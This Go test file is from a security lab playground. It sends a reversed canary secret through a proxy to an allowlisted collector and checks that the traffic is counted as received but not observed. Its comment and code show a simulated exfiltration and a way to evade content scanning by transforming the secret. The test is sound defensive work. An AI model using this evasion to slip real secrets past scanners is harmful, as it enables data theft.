// Copyright 2026 Josh Waldrep
// SPDX-License-Identifier: Apache-2.0

package playground

import (
	"bytes"
	"context"
	"io"
	"net/http"
	"net/url"
	"testing"
)

// TestLiveRun_TransformedCanaryCountsAsReceivedNotObserved drives a transformed
// (reversed) canary through the real lab proxy to the allowlisted collector. A
// transformed payload evades shape-based content scanning, so the proxy allows it
// and the collector receives it. The fix requires that this traffic count toward
// the OPEN run's witness as received-but-not-observed: TotalCount >= 1 (it
// arrived) while ObservedCount == 0 (the raw planted value was not seen), instead
// of vanishing into an attacker-chosen empty nonce bucket. This is what keeps the
// witness honest: "received N, observed the raw secret 0", never "nothing arrived".
func TestLiveRun_TransformedCanaryCountsAsReceivedNotObserved(t *testing.T) {
	const runNonce = "window-run"
	lr, err := StartLiveRun(context.Background(), LiveRunOpts{
		ScenarioID: LiveDemoScenarioID,
		RunNonce:   runNonce,
	})
	if err != nil {
		t.Fatalf("StartLiveRun: %v", err)
	}
	defer lr.Close()

	proxyURL, err := url.Parse("http://" + lr.proxyLn.Addr().String())
	if err != nil {
		t.Fatalf("proxy URL: %v", err)
	}
	client := &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(proxyURL)}}

	reversed := reverseString(lr.canaryValue)
	req, err := http.NewRequestWithContext(context.Background(), http.MethodPost, lr.liveExfilURL(), bytes.NewReader([]byte("field="+reversed)))
	if err != nil {
		t.Fatalf("request: %v", err)
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("proxied POST: %v", err)
	}
	_, _ = io.Copy(io.Discard, resp.Body)
	_ = resp.Body.Close()
	if resp.StatusCode >= 400 {
		t.Fatalf("transformed canary was blocked HTTP %d; this test expects the allowlisted collector to receive it", resp.StatusCode)
	}

	// The transformed payload must count toward the OPEN run, not a hidden bucket.
	if got := lr.collector.TotalCount(runNonce); got < 1 {
		t.Fatalf("open-run total = %d, want >= 1 (the collector received the request)", got)
	}
	if got := lr.collector.ObservedCount(runNonce); got != 0 {
		t.Fatalf("open-run observed = %d, want 0 (transformed payload is not the raw planted value)", got)
	}
	// No traffic should be hiding in an empty/attacker-chosen nonce bucket.
	if got := lr.collector.TotalCount(""); got != 0 {
		t.Fatalf("empty-nonce bucket total = %d, want 0 (traffic must not hide outside the run witness)", got)
	}
}
